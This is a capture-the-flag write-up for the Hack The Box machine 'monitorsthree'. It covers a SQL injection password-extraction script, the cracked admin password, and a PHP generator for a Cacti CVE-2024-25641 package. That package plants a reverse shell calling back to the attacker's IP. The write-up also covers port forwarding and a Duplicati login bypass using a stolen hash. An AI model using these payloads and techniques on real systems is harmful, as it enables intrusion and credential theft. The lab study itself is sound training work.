This is a writeup for recently expired monitorsthree machine in Hackthebox platform.

### Part 1: Enumeration

As always lets start with good old nmap scan:

![NMAP](/static/writeups/HTB-S-VI/monitors/1.png)

SSH and HTTP with port 22 and 80 respectively are open.
lets see what website is hosted in port 80, we have to add monitorsthree.htb to machine ip in /etc/hosts:

![NMAP](/static/writeups/HTB-S-VI/monitors/2.png)

I can see site called monitorsthree.htb, to enumerate subdomain i made bash script, to add wordlist to /etc/host and send request to it:

```
#!/bin/bash

DOMAIN="monitorsthree.htb"
IP="10.10.11.30"

WORDLIST="/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"


while read -r SUBDOMAIN; do
    FULLDOMAIN="${SUBDOMAIN}.${DOMAIN}"

    echo "$IP $FULLDOMAIN" >> /etc/hosts

    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://$FULLDOMAIN")

    if [ "$RESPONSE" == "302" ]; then
        echo "Found: $FULLDOMAIN"
    fi

    sed -i "/$FULLDOMAIN/d" /etc/hosts

done < "$WORDLIST"

```

I found interesting subdomain called 'cacti.monitorsthree.htb', it asks for login credentials we don't have any so for now lets keep note of it.

there is a login page in monitorsthree.htb/login.php, and when using forgot password, i found sql injection in forgot_password.php by submitting:`'`:

![NMAP](/static/writeups/HTB-S-VI/monitors/3.png)

### Part 2: Foothold

by submitting : `'order by 3--+` till it gives error, from error we can see that it uses mariadb
or we can use:

```
ad'union select null,null,null,null,null,null,null,null,null from dual--
```

when we query nine column it says successfully sent request code, so we should use nine column from now in our sql query.
by submitting `'||(SELECT '' FROM table)||'` it gives error and querying using

```
ad'||(SELECT '' FROM users)||'
```

It gives successful output

![NMAP](/static/writeups/HTB-S-VI/monitors/5.png)

now we know there is a table called users.
To enumerate user, i first used username administrator

```
ad' ||((SELECT 'a' FROM users WHERE username='administrator')='a')||'
```

this gives error: `Unable to process request, try again!`

![NMAP](/static/writeups/HTB-S-VI/monitors/4.png)

but as when we input admin:

```
ad' ||((SELECT 'a' FROM users WHERE username='admin')='a')||'
```

it outputs: `Successfully sent password reset request!`
![NMAP](/static/writeups/HTB-S-VI/monitors/5.png)

so, we know there is user called admin more clinically now.

```
ad' ||((SELECT 'a' FROM users WHERE username='admin' and length(password)=32)='a')||'
```

I found out password length is 32, now to enumerate password one by one character i am using below queries:

```
ad' ||(SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='3'||'
```

```
ad' ||(SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='1'||'
```

It is time consuming so i decided to do it with python script:

```
import requests
import time

# Target URL
url = "http://monitorsthree.htb/forgot_password.php"

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Function to check if a guessed character is correct
def is_correct_char(position, char):
    # Construct payload
    payload = f"ad' ||((SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')='{char}')||'"

    # Data to be sent in the POST request
    data = {
        "username": payload,
        "submit": "Send"
    }

    try:
        # Send the POST request
        response = requests.post(url, data=data)
        # Check response to see if the guess was correct
        if "Successfully sent password reset request!" in response.text:
            return True
    except requests.exceptions.ConnectionError as e:
        print("Connection error. Retrying...")
        time.sleep(5)  # Wait for 5 seconds before retrying
        return is_correct_char(position, char)
    return False

# Loop to find each character of the password
for position in range(1, 33):  # Assuming password length is 32
    for char in characters:
        if is_correct_char(position, char):
            # Add the correct character to the known password
            known_password += char
            print(f"[+] Found character {position}: {char}")
            break
    # Delay to avoid server-side rate limiting or detection
    time.sleep(1)  # Adjust the delay as necessary

# Print the complete password when done
print(f"[+] Password: {known_password}")

```

Output:

![NMAP](/static/writeups/HTB-S-VI/monitors/6.png)

I got admin user hash value from it:

By using hashid, i think it is md5 hash

![NMAP](/static/writeups/HTB-S-VI/monitors/7.png)

I cracked the hash using hashcat which corresponds to: greencacti2001

![NMAP](/static/writeups/HTB-S-VI/monitors/8.png)

Now, lets use these credential in login.php and 'cacti.monitorsthree.htb'. One thing i notice when opening 'cacti.monitorsthree.htb' is it is using cacti v 1.2.26 and quick research shows us vulnerability in this specific version to use Arbitrary file write to RCE.

[CVE-2024-25641](https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26.git)

To get shell i used this:

```
<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/shell.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = "<?php
\$ip = '10.10.14.59';
\$port = 3669;
\$sock = fsockopen(\$ip, \$port);
\$proc = proc_open('/bin/bash -i', array(0 => \$sock, 1 => \$sock, 2 => \$sock), \$pipes);
?>";
$keypair = openssl_pkey_new();
$public_key = openssl_pkey_get_details($keypair)["key"];
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("shell.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat shell.xml | gzip -9 > shell.xml.gz; rm shell.xml");

?>


```

save this as shell.php and run it using `php shell.php`, it will generate file called shell.xml.gz upload it in import packages in cacti:

![NMAP](/static/writeups/HTB-S-VI/monitors/9.png)

As you can see, we successfully uploaded shell.php in the machine, we can execute it by going to: `http://cacti.monitorsthree.htb/cacti/resource/shell.php`
before that open netcat listener in your machine: `nc -nvlp port`
I got shell as www-data using this method.

### Part 3: User and root:

finally, getting shell as www_data, i begin to enumerate system and found out it was using duplicati as i fouund folder called duplicati in `/opt` directory and a user called marcus via /etc/passwd.
Using ss -tnlp i found out duplicati is running in port 8200, port forwarding it using Socat:

```
In monitorsthree shell
socat TCP-LISTEN:1337,fork TCP:localhost:8200

In host machine
socat TCP-LISTEN:8200,fork TCP:monitorsthree_IP:1337
```

Now, i can visit site in port 8200 in our machine, going there we are directed into login.html where it asks for password. Trying default duplicati password like 'DUPLICATI,duplicati,Duplicate' doesnot seem to work. Remember i found duplicati folder earlier, looking files recursively in that folder i found a file called `Duplicati-server.sqlite` in `/opt/duplicati/config/` which i can read using `strings`.
I found interesting hash in there:

![NMAP](/static/writeups/HTB-S-VI/monitors/10.png)

Using those hashes directly lead me nowhere so, after researching for a while i found a way to login with this process:
open up burpsuite and intercept the traffic, after submitting password we can see it creates nonce value and salt. notice that salt it gives in response and salt found in that duplicati file are same.

![NMAP](/static/writeups/HTB-S-VI/monitors/11.png)

But, nonce is different each time we login, and in burp http-history notice it executes javascript for converting password into hash value

![NMAP](/static/writeups/HTB-S-VI/monitors/12.png)

```
var saltedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Utf8.parse($('#login-password').val()) + CryptoJS.enc.Base64.parse(data.Salt)));
```

This `$('#login-password').val()` gets the entered password and concatenates it with the base64 decoded salt obtained from the server earlier using `CryptoJS.enc.Base64.parse`, then it is passed to the `CryptoJS.enc.Utf8.parse` function.

which returns the hexadecimal representation and then decodes that value with `CryptoJS.enc.Hex.parse` and performs a SHA256 of the raw content.

Then creates the variable `noncedpwd` using `saltedpwd` and the nonce.

```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);
```

Now run 'server-passphrase' hash found earlier in cyberchef using `From base64 and TO HEX`, this is our saltedpwd

![NMAP](/static/writeups/HTB-S-VI/monitors/13.png)

before creating password hash, we must adjust our time same as of monitorsthree machine because some token implementation is related to it. monitorsthree is using timezone `Etc/UTC` so, in your host machine use set `timedatectl set-timezone Etc/UTC`

Remember in each login it creates new nonce that we are able to use in that request only so intercept the request using burp and copy the URL decode the nonce value obtain via session-nonce in burp decoder.

![NMAP](/static/writeups/HTB-S-VI/monitors/14.png)

use it in noncedpwd with saltedpwdrunnning:

```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);
```

![NMAP](/static/writeups/HTB-S-VI/monitors/15.png)
Now url encode password hash using `CTRL + U` in burp and use it in previously intercepted login request:

![NMAP](/static/writeups/HTB-S-VI/monitors/16.png)

and got directed to Duplicati panel

![NMAP](/static/writeups/HTB-S-VI/monitors/17.png)

now, create two folder in /tmp directory eg: fat and dat and go in add backup and setup the backup choose backup destination as `/source/tmp/dat` and source data as `/source/home/marcus/` then run it.

Notice three different file in `/tmp/dat` as it succed now in restore tab select that backup and select user.txt in select files and `/source/tmp/fat/` as restore destination, now i can see all file from `/home/marcus/` present in `/tmp/fat` and got user flag:

![NMAP](/static/writeups/HTB-S-VI/monitors/18.png)

using similar technique for root flag which is located in `/root/root.txt` i got root flag:

![NMAP](/static/writeups/HTB-S-VI/monitors/19.png)

### Conclusion

Overall, it was pretty challenging machine for me, but i learned a lot from it.
